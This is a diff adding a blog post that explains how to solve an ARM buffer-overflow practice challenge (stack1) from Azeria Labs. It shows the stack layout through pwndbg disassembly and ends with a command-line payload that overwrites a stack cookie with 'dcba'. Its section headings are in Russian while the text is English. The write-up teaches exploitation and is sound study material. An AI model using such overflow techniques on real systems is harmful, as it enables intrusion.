@@ -1,0 +1,273 @@
+---
+layout: post
+title: "Smashing ARM Stack for Fun - Part II"
+---
+
+This is going to be a fast moving post, directly to the details,
+about exploiting the [second Arm challenge](https://github.com/azeria-labs/ARM-challenges)<!--more-->
+
+
+## Распределение стека
+
+```nasm
+ ► 0x104b0 <main>       push   {fp, lr}
+   0x104b4 <main+4>     add    fp, sp, #4
+   0x104b8 <main+8>     sub    sp, sp, #0x50
+   0x104bc <main+12>    str    r0, [fp, #-0x50]
+   0x104c0 <main+16>    str    r1, [fp, #-0x54]
+```
+
+0x58 bytes are allocated where 0x54 bytes belong to the current stack
+frame.
+
+The first two words are allocated by `push` and the rest by `sub`.
+
+```python
+100:00> ;! M[sp:]   # <-- from sp to the end of the mapped page
+[
+        --
+        |   \xee\xee\xee\xee   == r1
+        |   \xdd\xdd\xdd\xdd   == r0
+  0x50  |   \x00\x00\x00\x00
+        |   ... 16 more rows full of zeros ...
+cookie -|-->\x00\x00\x00\x00
+        --
+   0x8  |   \xbb\xbb\xbb\xbb   == fp
+ fp ----|-->\xaa\xaa\xaa\xaa   == lr
+        --
+] <-- base of stack
+```
+
+## Проверка аргументов
+
+{% marginnote
+'`errx` prints a message to the standard error output and then makes
+the program exit.
+<br />
+See [man errx](https://linux.die.net/man/3/errx)
+' %}
+
+`argc` is expected to be 1 otherwise the program will **not** jump
+and `errx` will be called.
+
+```nasm
+   0x104c4 <main+20>    ldr    r3, [fp, #-0x50]
+   0x104c8 <main+24>    cmp    r3, #1
+   0x104cc <main+28>    bne    #main+44 <main+44>
+
+   0x104d0 <main+32>    mov    r0, #1
+   0x104d4 <main+36>    ldr    r1, [pc, #0x5c]
+   0x104d8 <main+40>    bl     #errx@plt <errx@plt>
+
+ ► 0x104dc <main+44>    mov    r3, #0
+```
+
+{% marginnote
+'As mentioned in a [previous post](/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html),
+when `pc` is used for indexing
+the `pc` is the address of the current about-to-be-executed instruction
+*plus* 8 bytes.
+' %}
+
+Let's see  `ldr r1, [pc, #0x5c]` which translates to 0x104d4 + 0x5c + 0x8:
+
+```nasm
+pwndbg> x/1wx 0x10538
+0x10538 <main+136>:     0x000105bc
+
+pwndbg> x/1bs 0x000105bc
+0x105bc:        "please specify an argument\n"
+```
+
+## Переполнение буфера
+
+A cookie is stored in the stack with a value of zero. Then `argv`
+is loaded into `r3` or `&argv[0]` if you want.
+
+The `add` instruction moves `argv` pointer 4 bytes forward. In other
+words, `r3` *points* to `argv[1]`.
+
+Finally the pointer is dereferenced and `r3` *has* the `argv[1]`
+pointer.
+
+```nasm
+ ► 0x104dc <main+44>    mov    r3, #0
+   0x104e0 <main+48>    str    r3, [fp, #-8]
+   0x104e4 <main+52>    ldr    r3, [fp, #-0x54]
+   0x104e8 <main+56>    add    r3, r3, #4
+   0x104ec <main+60>    ldr    r3, [r3]
+```
+
+Like in the [previous challenge](/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html),
+begin of the buffer for `strcpy`
+is 4 bytes below the pushed arguments and has a size of 64 bytes
+(0x48 bytes minus 4 bytes for the pushed `fp` and 4 bytes for the
+cookie)
+
+```nasm
+   0x104f0 <main+64>    sub    r2, fp, #0x48
+```
+
+```python
+100:20> ;! M[sp:]
+[
+        --
+        |   \xee\xee\xee\xee   == r1
+        |   \xdd\xdd\xdd\xdd   == r0
+  0x50  |   \x00\x00\x00\x00
+buf ----|-->AAAA
+        |   BBBB
+        |   CCCC
+        |   ... 13 more rows full of zeros ...
+cookie -|-->\x00\x00\x00\x00
+        --
+   0x8  |   \xbb\xbb\xbb\xbb   == fp
+ fp ----|-->\xaa\xaa\xaa\xaa   == lr
+        --
+]
+```
+
+Finally the call to `strcpy` is made:
+
+```nasm
+   0x104f4 <main+68>    mov    r0, r2
+   0x104f8 <main+72>    mov    r1, r3
+   0x104fc <main+76>    bl     #strcpy@plt <strcpy@plt>
+```
+
+## Сравнение
+
+```nasm
+ ► 0x10500 <main+80>     ldr    r3, [fp, #-8]
+   0x10504 <main+84>     ldr    r2, [pc, #0x30]
+   0x10508 <main+88>     cmp    r3, r2
+   0x1050c <main+92>     bne    #main+108 <main+108>
+```
+
+The cookie is loaded from the stack and compared with the value
+stored in the code segment at 0x10504 + 0x30 + 0x8:
+
+```nasm
+pwndbg> x/1wx 0x1053c
+0x1053c <main+140>:     0x61626364
+```
+
+The good old `'abcd'` or `'dcba'` to be more precise due the endianess
+of the machine.
+
+A byte by byte inspection may make this more explicit:
+
+```nasm
+pwndbg> x/4bx 0x1053c
+0x1053c <main+140>:     0x64    0x63    0x62    0x61
+```
+
+
+## Наша цель (branch at 0x1050c **not** taken):
+
+```nasm
+pwndbg> pdisass 0x10510
+ ► 0x10510 <main+96>     ldr    r0, [pc, #0x28]
+   0x10514 <main+100>    bl     #puts@plt <puts@plt>
+
+   0x10518 <main+104>    b      #main+124 <main+124>
+
+pwndbg> x/1wx 0x10540
+0x10540 <main+144>:     0x000105d8
+
+pwndbg> x/1bs 0x000105d8
+0x105d8:        "you have correctly got the variable to the right value"
+```
+
+## Неудача (branch at 0x1050c **is** taken):
+
+```nasm
+pwndbg> pdisass &main+108 10
+ ► 0x1051c <main+108>    ldr    r3, [fp, #-8]
+   0x10520 <main+112>    ldr    r0, [pc, #0x1c]
+   0x10524 <main+116>    mov    r1, r3
+   0x10528 <main+120>    bl     #printf@plt <printf@plt>
+
+pwndbg> x/1wx 0x10544
+0x10544 <main+148>:     0x00010610
+
+pwndbg> x/1bs 0x00010610
+0x10610:        "Try again, you got 0x%08x\n"
+```
+
+## Эпилог
+
+We reach here regardless of which path the branch at 0x1050c jumped to:
+
+```nasm
+pwndbg> pdisass &main+124
+ ► 0x1052c <main+124>    mov    r0, r3
+   0x10530 <main+128>    sub    sp, fp, #4
+   0x10534 <main+132>    pop    {fp, pc}
+```
+
+## Атака
+
+```shell
+pi@raspberrypi:~$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
+you have correctly got the variable to the right value
+```
+
+<!-- stuff -->
+
+<script>
+function fix_asm_syntax(ev) {
+    // pip install selectq
+    //   cond = (val('text()') == 'blt') | (val('text()') == 'b') | (val('text()').startswith('mov')) | ...
+    //   div = sQ.select('div', attr('class').contains('language-nasm'))
+    //   xpath = div.select('span', cond)
+
+    // Make some instructions "keywords"
+    var xpath = ".//div[contains(@class,'language-nasm')]//span[(((text() = 'blt') or (text() = 'b')) or starts-with(text(), 'mov')) or starts-with(text(), 'ldm') or starts-with(text(), 'stm') or starts-with(text(), 'ldr') or starts-with(text(), 'bx') or starts-with(text(), 'bl') or starts-with(text(), 'bne') or starts-with(text(), 'mvn')]";
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i < elems.length; i++) {
+        var el = elems[i];
+        el.classList.add('k'); // keyword
+        el.classList.remove('n'); // noun
+    }
+
+    // Remove the 'err' class
+    var xpath = ".//div[contains(@class,'language-nasm')]//span[@class='err']"
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i < elems.length; i++) {
+        var el = elems[i];
+        el.classList.remove('err'); // syntax error
+    }
+
+    // Remove the 'err' class
+    var xpath = ".//div[contains(@class,'language-python')]//span[@class='err']"
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i < elems.length; i++) {
+        var el = elems[i];
+        el.classList.remove('err'); // syntax error
+    }
+}
+
+document.addEventListener('DOMContentLoaded', fix_asm_syntax);
+</script>
